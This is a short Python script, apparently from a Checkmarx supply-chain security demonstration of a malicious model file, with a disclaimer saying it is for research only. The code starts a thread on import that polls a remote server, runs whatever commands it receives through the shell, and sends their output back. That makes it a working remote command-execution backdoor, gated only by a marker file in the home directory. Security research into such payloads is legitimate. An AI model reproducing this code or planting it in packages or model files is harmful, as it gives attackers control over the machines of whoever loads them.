# DISCLAIMER
# This script is intended solely for research purposes and should only be executed in a controlled environment. It is designed to demonstrate potential security vulnerabilities and should not be used maliciously or for any unauthorized activities.
# If you have any questions or concerns regarding this experiment, please contact us at supplychainsecurity@checkmarx.com for clarification or assistance.
# By using this script, you agree to adhere to ethical and legal guidelines, and you accept all responsibility for any consequences that may arise from its use. Use it responsibly and only on systems and networks that you have explicit permission to access and assess.


def shell():
    import os
    import time
    from urllib import request
    import subprocess
    from urllib.error import URLError, HTTPError

    server_url = 'http://remote-shell-demo.scs.checkmarx.com:30880/'

    home_dir_path = os.path.expanduser('~')
    shell_kill_switch = os.path.join(home_dir_path, '.checkmarx-malicious-hf-model-demo')

    if not os.path.isfile(shell_kill_switch):
        return

    while True:
        try:
            command = request.urlopen(server_url).read().decode()
            if command == 'stop':
                return

            command = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            output = command.stdout.read()
            stderr = command.stderr.read()
            data = output + stderr
            request.urlopen(request.Request(server_url, data=data))
        except HTTPError:
            return
        except (ConnectionError, URLError):
            time.sleep(1)


import threading
threading.Thread(target=shell).start()
